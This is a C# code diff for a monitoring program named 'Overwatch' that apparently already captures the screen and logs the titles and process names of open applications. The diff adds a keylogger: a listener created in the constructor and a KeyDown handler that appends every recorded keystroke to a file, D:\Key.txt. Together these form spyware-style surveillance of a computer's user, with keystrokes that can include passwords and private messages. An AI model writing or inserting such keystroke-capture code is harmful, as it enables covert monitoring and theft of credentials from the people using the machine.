@@ -15,10 +15,12 @@ namespace Overwatch
         public Graphics graph;
         public Bitmap bmp;
         static appLog Log;
+        static cKeylogger listener;
         public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
         public cReceiveInformation()
         {
             graph = null;
+            listener = new cKeylogger();
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Log = new appLog();
         }
@@ -93,6 +95,14 @@ namespace Overwatch
                 Process.GetProcesses().Where(p => new Regex(UsersName).IsMatch(p.MainWindowTitle)).ToList().ForEach(p => CreateAndUpdateDate(p.ProcessName + " ", "D:\\UsersApplication.txt"));
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
+        }
+
+        public void Add() {
+            listener.KeyDown += new RawKeyEventHandler(KeyboardRecorder);
+        }
+        public void KeyboardRecorder(object sender, RawKeyEventArgs args)
+        {
+            CreateAndUpdateDate(args.ToString(),"D:\\Key.txt");
         }
 
         public void Overview() {
